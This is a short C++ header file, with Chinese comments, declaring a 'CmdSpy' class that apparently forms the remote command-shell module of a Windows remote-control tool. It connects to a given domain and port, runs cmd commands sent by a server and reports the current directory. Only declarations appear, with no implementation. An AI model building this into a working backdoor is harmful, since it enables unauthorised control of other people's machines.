/*
 *
 *  Author: sumkee911@gmail.com
 *  Date: 25-12-2016
 *  Brief: 实现Cmd命令控制
 *
 */

#ifndef CMDSPY_H
#define CMDSPY_H

#include "tcpsocket.h"
#include <windows.h>
#include <iostream>

class CmdSpy
{
public:
    CmdSpy();
    ~CmdSpy();

    // 客户端发送到服务端的指令
    const std::string CmdPwd = "PWD";    // 当前文件位置

    // 分割符和结束符号
    const std::string CmdSplit = ";";
    const std::string CmdEnd = "\r\n";

    // 这个类的入口函数
    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI threadProc(LPVOID args);
    static void startCmdSpy(std::string domain, int port);
    static void addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size);

    // 执行cmd指令
    static std::string execCmd(std::string cmd);
    // 获取当前位置
    static std::string getPWD();
};

#endif // CMDSPY_H
